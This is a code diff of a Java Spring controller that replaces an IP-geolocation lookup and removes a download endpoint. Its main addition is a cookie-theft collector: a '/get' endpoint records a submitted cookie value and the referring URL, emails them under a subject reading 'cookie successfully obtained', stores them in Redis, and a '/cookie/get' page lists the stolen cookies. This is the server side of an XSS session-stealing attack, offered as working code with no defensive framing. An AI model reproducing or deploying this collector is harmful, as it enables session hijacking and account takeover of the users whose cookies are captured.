@@ -1,67 +1,120 @@
 package com.jcod3r.controller;
 
-import java.io.File;
 import java.io.IOException;
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.Comparator;
+import java.util.Date;
+import java.util.List;
 
 import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
 
-import org.apache.commons.io.FileUtils;
-import org.jsoup.Jsoup;
-import org.jsoup.nodes.Document;
-import org.springframework.http.HttpHeaders;
-import org.springframework.http.HttpStatus;
-import org.springframework.http.MediaType;
-import org.springframework.http.ResponseEntity;
+import org.apache.commons.lang3.ArrayUtils;
+import org.apache.commons.lang3.StringUtils;
+import org.springframework.core.io.ClassPathResource;
+import org.springframework.core.io.Resource;
 import org.springframework.stereotype.Controller;
 import org.springframework.ui.Model;
-import org.springframework.web.bind.annotation.PathVariable;
+import org.springframework.util.CollectionUtils;
 import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.ResponseBody;
 
-import com.alibaba.fastjson.JSONObject;
+import redis.clients.jedis.Jedis;
+
+import com.alibaba.fastjson.JSON;
+import com.jcod3r.entity.CookieEntity;
+import com.jcod3r.utils.EmailUtil;
+import com.jcod3r.utils.IP;
+import com.jcod3r.utils.RedisUtil;
 
 @Controller
 public class IndexController {
 
-	private static final String extName = ".rar";
+    @RequestMapping("/index.html")
+    public String index(Model model, HttpServletRequest request)
+            throws IOException {
+        // 由于使用了Nginx，所以不能简单使用request.getRemoteAddr();获得客户端IP
+        String ip = request.getHeader("x-forwarded-for");
+        if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {
+            ip = request.getHeader("Proxy-Client-IP");
+        }
+        if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {
+            ip = request.getHeader("WL-Proxy-Client-IP");
+        }
+        if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {
+            ip = request.getRemoteAddr();
+        }
 
-	@RequestMapping("/index.html")
-	public String index(Model model, HttpServletRequest request)
-			throws IOException {
-		// 由于使用了Nginx，所以不能简单使用request.getRemoteAddr();获得客户端IP
-		String ip = request.getHeader("x-forwarded-for");
-		if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {
-			ip = request.getHeader("Proxy-Client-IP");
-		}
-		if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {
-			ip = request.getHeader("WL-Proxy-Client-IP");
-		}
-		if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {
-			ip = request.getRemoteAddr();
-		}
-		String queryUrl = "http://ip.taobao.com/service/getIpInfo.php?ip=" + ip;
-		Document doc = Jsoup.connect(queryUrl).get();
-		JSONObject json = JSONObject.parseObject(
-				doc.getElementsByTag("body").get(0).text()).getJSONObject(
-				"data");
-		model.addAttribute("country", json.getString("country"));
-		model.addAttribute("city", json.getString("city"));
-		return "index";
-	}
+        Resource resource = new ClassPathResource("17monipdb.dat");
+        IP.load(resource.getFile().getAbsolutePath());
+        String[] ipAddr = IP.find(ip);
 
-	@RequestMapping("/download/{fileName}")
-	public ResponseEntity<byte[]> downLoad(@PathVariable String fileName,
-			HttpServletResponse response, HttpServletRequest request)
-			throws IOException {
-		File downloadFile = new File(this.getClass().getClassLoader()
-				.getResource("../../source/2048.rar").getPath());
-		HttpHeaders headers = new HttpHeaders();
-		headers.setContentType(MediaType.APPLICATION_OCTET_STREAM);
-		headers.setContentDispositionFormData("attachment",
-				new String(fileName.getBytes("UTF-8"), "iso-8859-1") + extName);
-		return new ResponseEntity<byte[]>(
-				FileUtils.readFileToByteArray(downloadFile), headers,
-				HttpStatus.CREATED);
-	}
+        model.addAttribute("country",
+            ArrayUtils.isEmpty(ipAddr) ? StringUtils.EMPTY : ipAddr[0]);
+        model.addAttribute("city",
+            ArrayUtils.isEmpty(ipAddr) ? StringUtils.EMPTY : ipAddr[1]);
+
+        return "index";
+    }
+
+    @ResponseBody
+    @RequestMapping({ "/get" })
+    public void handleCookie(@RequestParam String c, HttpServletRequest request) {
+        String referer = request.getHeader("Referer");
+
+        CookieEntity entity = new CookieEntity();
+        entity.setRefererUrl(referer);
+        entity.setCookie(c);
+        entity.setCreateTime(new Date());
+        try {
+            EmailUtil.sendSimpleEmail("成功获取Cookie", JSON.toJSONString(entity));
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        List<CookieEntity> cookies = null;
+        @SuppressWarnings("resource")
+        Jedis jedis = RedisUtil.getJedis();
+
+        String cookie = jedis.get("cookies");
+        if (StringUtils.isBlank(cookie)) {
+            cookies = new ArrayList<>();
+        } else {
+            cookies = JSON.parseArray(cookie, CookieEntity.class);
+        }
+        cookies.add(entity);
+
+        jedis.set("cookies", JSON.toJSONString(cookies));
+
+        RedisUtil.returnResource(jedis);
+    }
+
+    @SuppressWarnings("resource")
+    @RequestMapping({ "/cookie/get" })
+    public String getCookie(Model model) {
+        List<CookieEntity> cookies = null;
+        Jedis jedis = RedisUtil.getJedis();
+
+        String cookie = jedis.get("cookies");
+        if (!StringUtils.isBlank(cookie)) {
+            cookies = JSON.parseArray(cookie, CookieEntity.class);
+        }
+
+        RedisUtil.returnResource(jedis);
+
+        if (!CollectionUtils.isEmpty(cookies)) {
+            Collections.sort(cookies, new Comparator<CookieEntity>() {
+                @Override
+                public int compare(CookieEntity arg1, CookieEntity arg0) {
+                    return arg1.getCreateTime().compareTo(arg0.getCreateTime());
+                }
+            });
+        }
+
+        model.addAttribute("cookies", cookies);
+
+        return "cookie";
+    }
 
 }
